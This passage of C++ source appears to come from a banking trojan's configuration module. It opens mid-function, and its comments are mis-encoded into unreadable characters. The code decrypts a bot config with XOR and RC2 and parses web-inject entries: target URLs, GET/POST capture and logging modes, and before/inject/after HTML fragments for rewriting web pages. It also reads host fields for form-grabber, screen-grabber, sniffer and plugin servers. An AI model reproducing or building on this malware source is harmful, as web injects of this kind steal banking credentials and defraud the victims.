		SetOwner(FOwner->FItems);
}

void THTMLInjectData::Copy(const THTMLInjectData &Data)
{
	// ������� �������� ������
	Before = Data.Before;
	Inject = Data.Inject;
	After  = Data.After;
	State  = Data.State;
	MacrosHash = Data.MacrosHash;
	Disabled = Data.Disabled;
}


bool THTMLInjectData::IsValid()
{
	// ������� ���������� ������ ���� ������ ����� ������������
	// � ��������
	bool B = !Before.IsEmpty();
	bool I = !Inject.IsEmpty();
	bool A = !After.IsEmpty();

	return(B && I && A) || (B && A) || (B && I) || (I && A);

}


//*****************************************************************************
//                                 TBotConfig
//*****************************************************************************
TBotConfig::TBotConfig()
{
	HTMLInjects = new THTMLInjectList();
}

TBotConfig::~TBotConfig()
{
	delete HTMLInjects;
}


void TBotConfig::Clear()
{
	HTMLInjects->Clear();
}



bool TBotConfig::LoadFromFile(const string &FileName)
{
	// ������� ��������� ��������� �� �����

	// ������ � ���������� ������
    TLock Lock = HTMLInjects->GetLocker();
	//------------------------------

	Clear();

	if (FileName.IsEmpty())
		return false;

	DWORD  BufSize = 0;
	LPBYTE Buf = File::ReadToBufferA(FileName.t_str(), BufSize);
	if (Buf == NULL) return false;

	// ������ ������ HTML ��������
	TBJBConfigReader Reader(Buf, BufSize);
	bool Result = Reader.Read(this);

	// ����������� ������
	MemFree(Buf);

	// �������� �������
    HTMLInjects->CallEvent(BOT_EVENT_HTMLINJECTS_LOADED);

	return Result;

	//------------------------------
	// ������������� ������� �� ����������� ������
}


//*****************************************************************************
//                                 TBJBConfigReader
//*****************************************************************************
TBJBConfigReader::TBJBConfigReader(LPVOID Buf, DWORD BufSize)
{
    FSize = BufSize;
	FBuf = XORCrypt::DecodeBuffer((PCHAR)ConfigSignature, Buf, FSize);

	if (!FBuf)
	{
		// �� ������� ������������ ����, �������� �� ����������� ���������� RC2
		bool Decoded = RC2Crypt::Decode(GetMainPassword(), (PCHAR)Buf, FSize);
		if (Decoded)
		{
			FBuf = XORCrypt::DecodeBuffer((PCHAR)ConfigSignature, Buf, FSize);
        }
    }

}


bool TBJBConfigReader::Read(TBotConfig* Config)
{
	if (!Config || !FBuf) return false;

	// ������ ��������� �� ������

    TBotMemoryStream S(FBuf, FSize);

	// ���������� ���� ���������� �������� �������� ���� ����
	S.ReadByte();

	// ���������� ���������� �����
	DWORD Count = S.ReadInt();

	// ��������� ���������� � ������. (���������)

	S.ReadSizedString(); // FgrHostFromCfg
	S.ReadSizedString(); // GraHostFromCfg
	S.ReadSizedString(); // ScrHostFromCfg
	S.ReadSizedString(); // SniHostFromCfg
	S.ReadSizedString(); // PluginsHostFromCfg

	// ������ ���������� ������� (���������)
	S.ReadInt();

	//��������� ���������� (���������)
	S.ReadByte();
	S.ReadByte();

	// ------------- ��������� ������ �������� -------------//
	THTMLInject *Inject;
	THTMLInjectData *Data;
	DWORD ID = 0;

	for (DWORD i = 0; i < Count; i++)
	{
		Inject = Config->HTMLInjects->AddInject();
		if (Inject == NULL)	break;

		ID++;
		Inject->ID = ID;
		// ������ ����� �������
		Inject->URL = S.ReadSizedString();

		// ������ ������ ���������
		DWORD Mode = S.ReadInt();

		// ���������� ������ ������ �����
		Inject->GET = (Mode == 1 || Mode == 3 || Mode == 4 || Mode == 6);
		Inject->POST = (Mode == 2 || Mode == 3 || Mode == 5 || Mode == 6);
		Inject->IsLog = (Mode <= 3);

		DWORD DataCount = S.ReadInt();

		for (DWORD j = 0; j < DataCount; j++)
		{
			Data = Inject->AddData();
			if (Data == NULL) break;

			ID++;
			Data->ID = ID;
			Data->Before = S.ReadSizedString();
			Data->Inject = S.ReadSizedString();
			Data->After  = S.ReadSizedString();

			if (!Data->Before.IsEmpty())
				Data->MacrosHash = Data->Before.Hash();

			// � ������� ���� ��������� ���������� � ������ �������� �������
			#ifndef BV_APP
				HTMLInjectSetSystemVariables(Data);
			#endif
		}
	}
	return true;
}


